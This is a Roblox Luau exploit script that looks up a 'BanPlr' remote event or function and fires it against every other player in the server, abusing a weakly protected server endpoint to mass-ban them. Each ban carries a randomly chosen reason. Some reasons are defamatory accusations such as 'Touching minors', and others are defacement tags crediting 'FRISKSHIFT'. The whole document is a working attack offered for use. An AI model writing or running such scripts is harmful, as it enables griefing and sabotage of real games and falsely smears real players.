local banName = "BanPlr"
local aMethod = 1
local isFunction = false

function getInstance(name:string, instanceName:string)
    for _, even in game:GetDescendants() do
        if even.Name == name and even:IsA(instanceName) then
            return even
        end
    end
    return nil
end

local banPlr = getInstance(banName, isFunction and "RemoteFunction" or "RemoteEvent")
local PS = game:GetService("Players")
local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "OWO!!!! HACKED BY FRISKSHIFT!!", "FRISKSHIFT IS BACK"}

local function ban(p, reason)
    local bantable = {}
    if aMethod == 1 then
        bantable = {
            [1] = {
                [1] = p,
                [2] = p,
                [3] = reason
            }
        }
    elseif aMethod == 2 then
        bantable = {
            [1] = {
                [1] = p.UserId,
                [2] = p.UserId,
                [3] = reason
            }
        }
    elseif aMethod == 3 then
        bantable = {
            [1] = p.UserId,
            [2] = '',
            [3] = '',
            [4] = '',
            [5] = '',
        }
    else
        bantable = {
            [1] = p,
            [2] = '',
            [3] = '',
            [4] = '',
            [5] = '',
        }
    end
    if isFunction then
        banPlr:InvokeServer(unpack(bantable))
    else
        banPlr:FireServer(unpack(bantable))
    end
end

for _, p in PS:GetPlayers() do
    if p == PS.LocalPlayer then continue end
    ban(p, reasons[math.random(0, #reasons)])
end